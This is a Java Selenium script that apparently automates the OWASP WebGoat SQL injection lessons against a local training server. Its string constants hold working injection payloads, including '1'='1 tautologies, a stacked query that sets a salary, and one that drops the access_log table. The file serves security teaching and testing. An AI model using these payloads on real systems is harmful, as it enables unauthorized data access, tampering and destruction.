package org.owasp.webgoat;

import java.util.concurrent.TimeUnit;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;

public class WebGoatSQLIntro {

	public static int delay=1000;
	public static boolean useDelay = false;
	private static final String sql_2 = "select department from employees where last_name='Franco'";
	private static final String sql_3 = "update employees set department='Sales' where last_name='Barnett'";
	private static final String sql_4_drop = "alter table employees drop column phone";
	private static final String sql_4_add = "alter table employees add column phone varchar(20)";
	private static final String sql_5 = "grant alter table to UnauthorizedUser";
	private static final String sql_9_account = " ' ";
	private static final String sql_9_operator = "or";
	private static final String sql_9_injection = "'1'='1";
	private static final String sql_10_login_count = "2";
	private static final String sql_10_userid = "1 or 1=1";

	private static final String sql_11_a = "Smith' or '1' = '1";
	private static final String sql_11_b = "3SL99A'  or '1'='1";

	private static final String sql_12_a = "Smith";
	private static final String sql_12_b = "3SL99A' ; update employees set salary= '100000' where last_name='Smith";

	private static final String sql_13 = "%update% '; drop table access_log ; --'";

	private SeleniumConfig config;
	private String url = "http://127.0.0.1:8080/WebGoat";

	public WebGoatSQLIntro(boolean headless) {
		config = new SeleniumConfig(headless);
		useDelay = !headless;
		config.getDriver().get(url);
	}

	public void closeWindow() {
		this.config.getDriver().close();
	}

	public String getTitle() {
		return this.config.getDriver().getTitle();
	}

	public void login(String un, String pw) throws Exception {
		WebDriver driver = this.config.getDriver();

		delay();
		driver.get(url + "/login");
		delay();
		driver.manage().timeouts().implicitlyWait(30, TimeUnit.SECONDS);

		// Login
		driver.findElement(By.name("username")).sendKeys(un);
		delay();
		driver.findElement(By.name("password")).sendKeys(pw);
		delay();
		driver.findElement(By.className("btn")).click();

		// Check if user exists. If not, create user.
		if (driver.getCurrentUrl().equals(url + "/login?error")) {
			delay();
			driver.get(url + "/registration");
			delay();
			driver.findElement(By.id("username")).sendKeys(un);
			delay();
			driver.findElement(By.id("password")).sendKeys(pw);
			delay();
			driver.findElement(By.id("matchingPassword")).sendKeys(pw);
			delay();
			driver.findElement(By.name("agree")).click();
			delay();
			driver.findElement(By.className("btn-primary")).click();
			delay();
		}

	}

	public void exercise() throws Exception {
		WebDriver driver = this.config.getDriver();

		delay();
		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson");
		delay();
		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/1");
		delay();
		driver.findElement(By.id("restart-lesson-button")).click();
		delay();
		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/0");
		delay();
		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/1");
		delay();
		driver.findElement(By.name("query")).sendKeys(sql_2);
		delay();
		driver.findElement(By.name("query")).submit();
		delay();

		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/2");
		delay();
		driver.findElements(By.name("query")).get(1).sendKeys(sql_3);
		delay();
		driver.findElements(By.name("query")).get(1).submit();

		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/3");
		delay();
		driver.findElements(By.name("query")).get(2).sendKeys(sql_4_drop);
		delay();
		driver.findElements(By.name("query")).get(2).submit();
		delay();

		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/3");
		delay();
		driver.findElements(By.name("query")).get(2).clear();
		delay();
		driver.findElements(By.name("query")).get(2).sendKeys(sql_4_add);
		delay();
		driver.findElements(By.name("query")).get(2).submit();
		delay();
		driver.findElements(By.name("query")).get(2).clear();
		delay();
		driver.findElements(By.name("query")).get(2).sendKeys(sql_4_drop);
		delay();
		driver.findElements(By.name("query")).get(2).submit();
		delay();

		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/4");
		delay();
		driver.findElements(By.name("query")).get(3).sendKeys(sql_5);
		delay();
		driver.findElements(By.name("query")).get(3).submit();
		delay();

		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/8");
		delay();
		driver.findElement(By.name("account")).sendKeys("Smith'");
		delay();
		driver.findElement(By.name("operator")).sendKeys("OR");
		delay();
		driver.findElement(By.name("injection")).sendKeys("'1'='1");
		delay();
		driver.findElement(By.name("Get Account Info")).click();
		delay();

		driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/9");
		delay();
		driver.findElement(By.name("userid")).sendKeys(sql_10_userid);
		delay();
		driver.findElement(By.name("login_count")).sendKeys(sql_10_login_count);
		delay();
		driver.findElements(By.name("Get Account Info")).get(1).click();
		delay();
	}

	public void delay() throws Exception {
		if (useDelay) { Thread.sleep(delay); }
	}
}
